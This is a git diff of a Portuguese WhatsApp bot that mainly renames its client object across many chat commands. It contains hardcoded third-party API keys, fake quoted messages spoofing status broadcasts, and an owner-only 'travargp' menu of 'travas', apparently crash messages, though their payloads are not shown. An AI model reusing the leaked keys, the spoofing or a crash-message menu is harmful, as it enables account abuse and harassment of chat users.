 					break
 					case 'epep': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8749,17 +8089,8 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/epep?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'tai'})
 					break
-					/*case 'button': 
-					if (!isPremium) return fakegroup (mess.only.premium)
-					if (args.length < 1) return fakegroup (mess.blank)
-					teks = body.slice(8)
-					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
-					reply('*Estou fazendo, se der erro tente novamente ✓*')
-					buffer = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
-					break*/
 					case 'text3d': 
 					if (!isPremium) return fakegroup (mess.only.premium)
 					if (args.length < 1) return fakegroup (mess.blank)
@@ -8767,7 +8098,7 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
 					case 'text3d': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8776,7 +8107,7 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/text3d?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
 					case 'text3dbox': 
 					if (!isPremium) return fakegroup (mess.only.premium)
@@ -8785,12 +8116,12 @@ break
 					if (teks.length > 10) return fakegroup ('O texto é longo, até 10 caracteres')
 					reply('*Estou fazendo, se der erro tente novamente ✓*')
 					buffer = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
+					client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: null, caption: 'ta ai'})
 					break
 
 //INICIO DO JOGO DA VELHA ❌ ⭕ 🔲
 case 'ttthelp':
-		tomioka.sendMessage(from, ttthelp(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Jogo da velha", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
+		client.sendMessage(from, ttthelp(prefix) , text, {quoted: mek, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "Jogo da velha", 'jpegThumbnail': fs.readFileSync('./assets/botlogo.webp')}}}})					
                 break
 case 'ttt':				
 if (!isGroup) {
@@ -8822,8 +8153,8 @@ IA()
 tttset.reActivate1 = "on"	
 }
 reply(`O jogo começou!!!\nModo: ${tttset.tttdifficulty} use ${prefix}ttthelp caso não saiba jogar`, text, crtt)
-tomioka.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
-tomioka.sendMessage(from,`Bom jogo`, text) 
+client.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
+client.sendMessage(from,`Bom jogo`, text) 
 setTimeout( () => {
 tttset.waitingTime = "off"
 tttset.autoEndTime = "on"
@@ -8834,7 +8165,7 @@ case 'tttme':
 if (!isGroup) return fakegroup (ptbr.group())
 const checkTTTIdMe = getTTTId(sender)
 if (checkTTTIdMe === undefined) addTTTId(sender)
-tomioka.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:mek})
+client.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {quoted:mek})
 break	
 case 'tttrank':
 if (!isGroup) return fakegroup (ptbr.group())
@@ -8853,7 +8184,7 @@ mentioned_jid.push(tictactoe[i].jid)
 mentions(board, mentioned_jid, true)
 } catch (err) {
 console.log(err)
-await tomioka.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: mek})
+await client.sendMessage(from, `Humm, é necessário que no mínimo 3 pessoas tenham jogado...`, text, {quoted: mek})
 }
 break	
 case 'coord' :
@@ -8990,9 +8321,9 @@ randomTTTXP = Math.floor(Math.random() * 1000) + 1000
 addLevelingXp(tttset.player, randomTTTXP) 
 break
 }
-tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉\n\n➣  RECOMPENSA: +${randomTTTXP} XP 🔮`, text)
+client.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉\n\n➣  RECOMPENSA: +${randomTTTXP} XP 🔮`, text)
 } else {
-tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉`, text)
+client.sendMessage(from, `🎉🎉 VITÓRIA DO JOGADOR 🎉🎉`, text)
 }
 const currentTTTwins = getTTTwins(tttset.player)
 const checkTTTIdWin = getTTTId(tttset.player)
@@ -9024,9 +8355,9 @@ randomTTTXP = 0
 addLevelingXp(tttset.player, randomTTTXP)
 break
 }	
-tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉\n\n➣  PUNIÇÃO: ${randomTTTXP} XP 🔮`, text)
+client.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉\n\n➣  PUNIÇÃO: ${randomTTTXP} XP 🔮`, text)
 } else {
-tomioka.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉`, text)
+client.sendMessage(from, `🎉🎉 VITÓRIA DO 𝐁𝐎𝐓 🎉🎉`, text)
 }
 const currentTTTdefeats = getTTTdefeats(tttset.player)
 const checkTTTIdDefeat = getTTTId(tttset.player)
@@ -9040,9 +8371,9 @@ tttset.tttstatus = "off"
 tttset.waitingTime = "on"
 } else if (Tie()) {
 if (isCmd) {
-tomioka.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣  NÃO HÁ GANHOS NEM PERDAS`, text)
+client.sendMessage(from, `🎉🎉 EMPATE 🎉🎉\n\n➣  NÃO HÁ GANHOS NEM PERDAS`, text)
 } else {
-tomioka.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
+client.sendMessage(from, `🎉🎉 EMPATE 🎉🎉`, text)
 }
 const currentTTTties = getTTTties(tttset.player)
 const checkTTTIdTie = getTTTId(tttset.player)
@@ -9059,41 +8390,15 @@ tttset.tttantibug = "off"
 }
 break
 //_FIM DO JOGO DA VELHA By: Resen
-/*case 'autostk':
-                    if (!isGroup) return reply(ptbr.group())
-                    if (!isGroupAdmins) return reply(ptbr.admin())
-                    if (args.length < 1) return reply(`Digite da forma correta:\nComando: ${prefix}autostk 1 para ativar `)
-                    if (Number(args[0]) === 1) {
-                        if (isAuto) return reply('❎O recurso AUTO STICKER já está ativado no grupo❎')
-                        atsticker.push(from)
-                        fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(_leveling))
-                        reply('✅O recurso AUTO STICKER foi ativado✅')
-                    } else if (Number(args[0]) === 0) {
-                        if (!isAuto) return reply('❎O recurso AUTO STICKER não está ativado no grupo❎')
-                        let position = false
-                        Object.keys(atsticker).forEach((i) => {
-                            if (atsticker[i] === from) {
-                                position = i
-                            }
-                        })
-                        if (position !== false) {
-                            atsticker.splice(position, 1)
-                            fs.writeFileSync('./database/data/atisticker.json', JSON.stringify(atsticker))
-                        }
-                        reply('❌O recurso AUTO STICKER foi desativado❌')
-                    } else {
-                        reply(`Digite da forma correta:\nComando: ${prefix}autostk 1, para ativar e 0 para desativar`)
-                    }
-                    break*/
 case 'aviso':
 					if (!isOwner) return fakegroup ('Quem é você?')
 					if (args.length < 1) return fakegroup ('.......')
-					anu = await tomioka.chats.all()
+					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
 						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						buff = await tomioka.downloadMediaMessage(encmedia)
+						buff = await client.downloadMediaMessage(encmedia)
 						for (let _ of anu) {
-							tomioka.sendMessage(_.jid, buff, image, {caption: `[ 𝐀𝐯𝐢𝐬𝐨 𝐓𝐎𝐌??𝐎𝐊𝐀 𝐁𝐎𝐓 ]\n\n${body.slice(4)}`})
+							client.sendMessage(_.jid, buff, image, {caption: `[ 𝐀𝐯𝐢𝐬𝐨 𝐓𝐎𝐌??𝐎𝐊𝐀 𝐁𝐎𝐓 ]\n\n${body.slice(4)}`})
 						}
 						reply('Transmissao enviada')
 					} else {
@@ -9106,12 +8411,12 @@ case 'aviso':
 case 'tm':
 					if (!isOwner) return fakegroup ('Quem é você?')
 					if (args.length < 1) return fakegroup ('.......')
-					anu = await tomioka.chats.all()
+					anu = await client.chats.all()
 					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
 						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
 						
 						for (let _ of anu) {
-							tomioka.sendMessage(_.jid, image, {caption: `[ 𝐓𝐫𝐚𝐧𝐬𝐦𝐢𝐬𝐬𝐚̃𝐨 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 ]\n\n${body.slice(4)}`})
+							client.sendMessage(_.jid, image, {caption: `[ 𝐓𝐫𝐚𝐧𝐬𝐦𝐢𝐬𝐬𝐚̃𝐨 𝐓𝐎𝐌𝐈𝐎𝐊𝐀 ]\n\n${body.slice(4)}`})
 						}
 						reply('Transmissao enviada')
 					} else {
@@ -9122,13 +8427,13 @@ case 'tm':
 					}
 					break
 				case 'usuarios':
-				tomioka.sendMessage(from,`total de usuários registrados no TOMIOKA BOT 🥰: ${user.length}`, text)
+				client.sendMessage(from,`total de usuários registrados no TOMIOKA BOT 🥰: ${user.length}`, text)
 				break
 				case 'cgame':
 
 					return fakegroup (mess.wait)
 					buff = await getBuffer(`https://api.vhtear.com/gamelogo?text=${body.slice(7)}&apikey=${VthearApi}`, {method: 'get'})
-					tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
+					client.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
 					 
 					break 
 				case 'cparty':
@@ -9136,14 +8441,14 @@ case 'tm':
 					part = `${body.slice(8)}`
 					return fakegroup (mess.wait)
 					bufferu = await getBuffer(`https://api.vhtear.com/partytext?text=${part}&apikey=${VthearApi}`, {method: 'get'})
-					tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
+					client.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
 					 
 					break 
 				case 'cstyle':
 
 					return fakegroup (mess.wait)
 					buff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${body.slice(8)}&apikey=${VthearApi}`, {method: 'get'})
-					tomioka.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
+					client.sendMessage(from, buff, image, {caption: 'Aqui amigo (a)', quoted: mek})
 					 
 					break 
 				case 'cglass':
@@ -9151,7 +8456,7 @@ case 'tm':
 					glass = `${body.slice(8)}`
 					return fakegroup (mess.wait)
 					bufferu = await getBuffer(`https://api.vhtear.com/wetglass?text=${glass}&apikey=${VthearApi}`, {method: 'get'})
-					tomioka.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
+					client.sendMessage(from, bufferu, image, {caption: 'Aqui amigo (a)', quoted: mek})
 					 
 					break 
 					case 'croman':               
@@ -9159,7 +8464,7 @@ case 'tm':
                      if (args.length < 1) return fakegroup ('Cadê o texto, mano??')
                      if (args.length > 10) return fakegroup ('pelo menos 10 caracteres')
                      buff = await getBuffer(`https://api.vhtear.com/romancetext?text=${roman}&apikey=${VthearApi}`, {method: 'get'})
-                     tomioka.sendMessage(from, buff, image, {quoted: mek})
+                     client.sendMessage(from, buff, image, {quoted: mek})
                    
                   break 
 				case 'setnomebot':
@@ -9173,7 +8478,7 @@ case 'tm':
                      if (args.length > 10) return fakegroup ('pelo menos 10 caracteres')
 					 love = `${body.slice(7)}`
 					 buff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${love}&apikey=${VthearApi}`, {method: 'get'})
-					 tomioka.sendMessage(from, buff, image, {quoted: mek})
+					 client.sendMessage(from, buff, image, {quoted: mek})
 					 
 					 break
 case 'smeme': case 'stickmeme':
@@ -9184,7 +8489,7 @@ bottom = arg.split('|')[1]
 var imgbb = require('imgbb-uploader')
 if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
 ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek 
-owgi = await  tomioka.downloadAndSaveMediaMessage(ger)
+owgi = await  client.downloadAndSaveMediaMessage(ger)
 anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
 teks = `${anu.display_url}`
 ranp = getRandom('.gif')
@@ -9197,7 +8502,7 @@ reply('Use fotos/adesivos!')
 break
 case 'travargp':
 if (!isOwner) return reply('só dono')
-let tmporalc = tomioka.prepareMessageFromContent(from,{
+let tmporalc = client.prepareMessageFromContent(from,{
 "listMessage": {
 "title": "MENU DE TRAVAS ",
 "description": "Clique nos botões baixo e envie",
@@ -9235,20 +8540,20 @@ let tmporalc = tomioka.prepareMessageFromContent(from,{
 ]                    
 }
 }, {quoted:mek, contextInfo:tomio})
-tomioka.relayWAMessage(tmporalc)
+client.relayWAMessage(tmporalc)
 break
                 	case 'tomp3':
-                	tomioka.updatePresence(from, Presence.composing) 
+                	client.updatePresence(from, Presence.composing) 
 					if (!isQuotedVideo) return reply('Marque o video pfv')
 				    reply(mess.wait)
 					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+					media = await client.downloadAndSaveMediaMessage(encmedia)
 					ran = getRandom('.mp4')
 					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 						fs.unlinkSync(media)
 						if (err) return reply('❌ Falha ao converter vídeo para mp3 ❌')
 						buffer = fs.readFileSync(ran)
-						tomioka.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
+						client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
 						fs.unlinkSync(ran)
 					})
 				break
@@ -9284,13 +8589,13 @@ break
 					anu = await fetchJson(`https://api.vhtear.com/igprofile?query=${ige}&apikey=ANTIGRATISNIHANJENKKK`, {method: 'get'})
 					buffer = await getBuffer(anu.result.picture)
 					capt = `User Ditemukan!!\n\n*➸ Nama :* ${anu.result.full_name}\n*➸ Username :* ${anu.result.username}\n*➸ Followers :* ${anu.result.follower}\n*➸ Mengikuti :* ${anu.result.follow}\n*➸ Jumlah Post :* ${anu.result.post_count}\n*➸ TOMIOKA :* ${anu.result.is_private}\n*➸ Bio :* ${anu.result.biography}`
-					tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: capt})
+					client.sendMessage(from, buffer, image, {quoted: mek, caption: capt})
 					break
                    case 'map':
                    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                    data = await fetchJson(`https://mnazria.herokuapp.com/api/maps?search=${body.slice(5)}`)
                    hasil = await getBuffer(data.gambar)
-                   tomioka.sendMessage(from, hasil, image, {quoted: mek, caption: `Resultados de *${body.slice(5)}*`})
+                   client.sendMessage(from, hasil, image, {quoted: mek, caption: `Resultados de *${body.slice(5)}*`})
                    
                    break
 					case 'users':
@@ -9302,17 +8607,17 @@ break
 						teks += `\`\`\`[${no.toString()}]\`\`\` @${hehehe.split('@')[0]}\n`
 					}
 					teks += `│+ Total de usuários : ${user.length}\n╰──────*「 *TOMIOKA* 」*────`
-					 tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": user}})
+					 client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": user}})
 					break
                 case 'limparchat':
 					case 'clearall':
 					case 'limpar':
 					case 'limpa':
 									if (!isOwner) return fakegroup ('só o cria pode')
-					anu = await tomioka.chats.all()
-					tomioka.setMaxListeners(25)
+					anu = await client.chats.all()
+					client.setMaxListeners(25)
 					for (let _ of anu) {
-						tomioka.deleteChat(_.jid)
+						client.deleteChat(_.jid)
 					}
 					reply(`[❗] CHATS LIMPO`)
 				
@@ -9331,28 +8636,28 @@ var M_exe = []
 for (let cut of exe1) {
 M_exe.push(cut)
 }
-tomioka.groupRemove(from, M_exe)
+client.groupRemove(from, M_exe)
 } else {
-tomioka.groupRemove(from, [exe1[0]])
+client.groupRemove(from, [exe1[0]])
 }
 } else {
 	exe1 = mek.message.extendedTextMessage.contextInfo.participant
-tomioka.groupRemove(from, [exe1])
+client.groupRemove(from, [exe1])
 }
 reply(`[❗] tempo de ban : ${args[0]} ${args[1]}`)
 		setTimeout( () => {
 exe1 = mek.message.extendedTextMessage.contextInfo.participant
-tomioka.groupAdd(from, [exe1])			
+client.groupAdd(from, [exe1])			
 				}, timer)
 		
 break
 				case 'setppbot':
-				tomioka.updatePresence(from, Presence.composing) 
+				client.updatePresence(from, Presence.composing) 
 				if (!isQuotedImage) return fakegroup (`Envie fotos com legendas ${prefix}setbotpp ou tags de imagem que já foram enviadas`)
 					if (!isOwner) return fakegroup (mess.only.ownerB)
 					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					media = await tomioka.downloadAndSaveMediaMessage(enmedia)
-					await tomioka.updateProfilePicture(botNumber, media)
+					media = await client.downloadAndSaveMediaMessage(enmedia)
+					await client.updateProfilePicture(botNumber, media)
 					reply('Obrigado pelo novo perfil😗')
 					break
 case 'happymod': 
@@ -9362,7 +8667,7 @@ case 'happymod':
 				hupo = data.result[0] 
 				teks = `*Nome*: ${data.result[0].title}\n*versao*: ${hupo.version}\n*tamanho:* ${hupo.size}\n*root*: ${hupo.root}\n*valor*: ${hupo.price}\n*link*: ${hupo.link}\n*download*: ${hupo.download}`
 				buffer = await getBuffer(hupo.image)
-				tomioka.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
+				client.sendMessage(from, buffer, image, {quoted: mek, caption: `${teks}`})
 				
 				break
 				case 'setnome':
@@ -9370,14 +8675,14 @@ case 'happymod':
                    if (!isGroup) return fakegroup (mess.only.group)
 			       if (!isGroupAdmins) return fakegroup (mess.only.admin)
 			   	   if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
-                   tomioka.groupUpdateSubject(from, `${body.slice(9)}`)
-                   tomioka.sendMessage(from, 'Sucesso, alterou o nome do grupo', text, {quoted: mek})
+                   client.groupUpdateSubject(from, `${body.slice(9)}`)
+                   client.sendMessage(from, 'Sucesso, alterou o nome do grupo', text, {quoted: mek})
                    break
 				case 'infogc':
-				tomioka.updatePresence(from, Presence.composing)
+				client.updatePresence(from, Presence.composing)
 				if (!isGroup) return fakegroup (mess.only.group)
 					try {
-					ppimg = await tomioka.getProfilePicture(from)
+					ppimg = await client.getProfilePicture(from)
 				} catch {
 					ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
 				}
@@ -9389,19 +8694,19 @@ case 'happymod':
 						no += 1
 						teks += `[${no.toString()}]`
 					}
-					tomioka.sendMessage(from, buf, image, {quoted: mek, caption: teks})
+					client.sendMessage(from, buf, image, {quoted: mek, caption: teks})
 					break
 case 'block':
 
 if (!isOwner) return fakegroup ("Apenas em grupo.")
-tomioka.blockUser (`${body.slice(9)}@c.us`, "add")
-tomioka.sendMessage(from, `BLOQUEADO`, text)
+client.blockUser (`${body.slice(9)}@c.us`, "add")
+client.sendMessage(from, `BLOQUEADO`, text)
 break
                     case 'unblock':
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isOwner) return fakegroup (mess.only.ownerB)
-				    tomioka.blockUser (`${body.slice(9)}@c.us`, "remove")
-					tomioka.sendMessage(from, `Pedido recebido, desbloquear ${body.slice(9)}@c.us`, text)
+				    client.blockUser (`${body.slice(9)}@c.us`, "remove")
+					client.sendMessage(from, `Pedido recebido, desbloquear ${body.slice(9)}@c.us`, text)
 				    break
 				case 'bloqueados':
 				     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -9411,13 +8716,13 @@ break
 						teks += `~> @${block.split('@')[0]}\n`
 					}
 					teks += `Total : ${blocked.length}`
-					tomioka.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
+					client.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": blocked}})
 					break
 				case 'ler':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+						const media = await client.downloadAndSaveMediaMessage(encmedia)
 						return fakegroup (mess.wait)
 						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
 							.then(teks => {
@@ -9434,60 +8739,7 @@ break
 					break
 
 
-       /*case 'wafig':
-       
-        if (!isGroup)return tomioka.sendMessage(from, `[ ! ]  ᴄᴏᴍᴀɴᴅᴏ ᴅɪsᴘᴏɴɪʙʟᴇ sᴏʟᴏ ᴘᴀʀᴀ ʟᴏs ɢʀᴜᴘᴏs....`, MessageType.text, {quoted: mek, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
-        if (isMedia && !mek.message.videoMessage || isQuotedImage) {
-      const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-      const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
-      await ffmpeg(`${media}`)
-      .input(media)
-      .on('start', function (cmd) {
-      console.log(`Started : ${cmd}`)
-      })
-      .on('error', function (err) {
-      console.log(`Error : ${err}`)
-      fs.unlinkSync(media)
-      reply(mess.error.api)
-        })
-      .on('end', async function () {
-      console.log('Finish')
-      const webpWithMetadata = await WSF.setMetadata('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
-      tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: mek, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
-      fs.unlinkSync(media)  
-      fs.unlinkSync(`./sticker/${sender}.webp`)  
-      })
-      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
-      .toFormat('webp')
-      .save(`./sticker/${sender}.webp`)
-      } else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
-      const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-      const media = await tomioka.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
-      tomioka.sendMessage(from, `[ ! ]  ᴘᴏʀ ғᴀᴠᴏʀ ᴇsᴘᴇʀᴀ....`, MessageType.text, {quoted: mek, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
-      await ffmpeg(`${media}`)
-      .inputFormat(media.split('.')[4])
-      .on('start', function (cmd) {
-      console.log(`Started : ${cmd}`)
-      })
-      .on('error', function (err) {
-      console.log(`Error : ${err}`)
-      fs.unlinkSync(media)
-      tipe = media.endsWith('.mp4') ? 'video' : 'gif'
-      })
-      .on('end', async function () {
-      console.log('Finish')
-      const webpWithMetadata = await WSF.setMetadata('PAQUETE', 'AUTOR', `./sticker/${sender}.webp`)
-      tomioka.sendMessage(from, webpWithMetadata, MessageType.sticker, {quoted: mek, sendEphemeral: true, contextInfo: {"forwardingScore": 9999, "isForwarded": true}})
-      fs.unlinkSync(media)
-      fs.unlinkSync(`./sticker/${sender}.webp`)
-      })
-      .addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
-      .toFormat('webp')
-      .save(`./sticker/${sender}.webp`)
-          } else {
-      reply(`Envíe una foto/video + el comando ${prefix}sticker\n\nTambién funciona si mencionas una foto o video junto al mismo comando\n\nNota: La duración máxima del video es de 10 segundos`)
-      }
-        break*/
+     
 case 'amongus':
 if (!isGroup) return reply('só gp')
                     if (!isGroupAdmins) return fakegroup (ind.admin())
@@ -9507,14 +8759,14 @@ if (!isGroup) return reply('só gp')
                   1 impostor remain   。　.
 　 　　。　　 　　　　ﾟ　　　.　      　　　.
 ,　　　　.                  .`
-                        //tomioka.groupRemove(from, mentioned)
+                        //client.groupRemove(from, mentioned)
                     mentions(`${sus}`, mentioned, true)
                     break
 case 'st':
                 
 if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-const media = await tomioka.downloadAndSaveMediaMessage(encmedia)                                     
+const media = await client.downloadAndSaveMediaMessage(encmedia)                                     
 rano = getRandom('.webp')
 await ffmpeg(`./${media}`)
 .input(media)
@@ -9531,12 +8783,12 @@ reply(mess.wait())
 exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
 fs.unlinkSync(media)
 buffer1 = fs.readFileSync(rano)
-tomioka.sendMessage(from, buffer1, sticker, {quoted: ftoko})
+client.sendMessage(from, buffer1, sticker, {quoted: ftoko ,contextInfo: tomis})
 fs.unlinkSync(rano)
 })
 } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
 const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+const media = await client.downloadAndSaveMediaMessage(encmedia)
 rano = getRandom('.webp')
 reply('❬❗❭ Espera mano')
 await ffmpeg(`./${media}`)
@@ -9555,7 +8807,7 @@ reply(`Falha na conversão de ${tipe} para sticker`)
 exec(`ffmpeg -i ${media} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
 fs.unlinkSync(media)
 buffer2 = fs.readFileSync(rano)
-tomioka.sendMessage(from, buffer2, sticker, {quoted: ftoko})
+client.sendMessage(from, buffer2, sticker, {quoted: ftoko ,contextInfo: tomis})
 fs.unlinkSync(rano)
 })
 } else {
@@ -9577,7 +8829,7 @@ break
                 case 's':
 					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
                         const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                        const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+                        const media = await client.downloadAndSaveMediaMessage(encmedia)
                         ran = getRandom('.webp')
                         reply(mess.wait)
                         await ffmpeg(`./${media}`)
@@ -9594,8 +8846,8 @@ break
                                 
                                 exec(`webpmux -set exif ${addMetadata('TIOTOMIOKA', '(44) 98220867')} ${ran} -o ${ran}`, async(error) => {
                                     if (error) return reply('erro')
